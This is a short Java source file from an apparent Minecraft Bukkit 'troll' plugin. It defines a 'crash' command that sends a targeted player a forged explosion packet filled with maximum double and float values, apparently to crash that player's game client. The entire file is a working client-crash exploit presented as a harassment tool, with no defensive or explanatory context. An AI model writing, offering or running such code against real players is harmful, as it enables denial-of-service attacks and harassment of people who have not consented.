package me.redth.trollplugin;

import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class Crash implements CommandBase {
    @Override
    public String getLabel() {
        return "crash";
    }

    @Override
    public void execute(CommandSender sender, Player player) {
        CraftPlayer craftPlayer = (CraftPlayer) player;
        PacketPlayOutExplosion explosion = new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, new ArrayList<>(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
        craftPlayer.getHandle().playerConnection.sendPacket(explosion);
    }
}
